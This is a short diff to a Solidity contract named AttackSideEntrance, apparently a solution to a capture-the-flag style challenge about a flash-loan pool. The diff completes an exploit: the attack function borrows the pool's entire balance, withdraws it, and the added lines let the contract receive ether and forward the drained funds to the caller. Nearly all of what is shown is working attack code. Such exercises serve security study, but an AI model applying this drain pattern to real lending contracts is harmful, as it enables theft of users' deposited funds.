@@ -48,9 +48,12 @@ contract AttackSideEntrance {
 
     fallback() external payable {}
 
+    receive() external payable {}
+
     function attack() external {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     function exexcute() external payable {
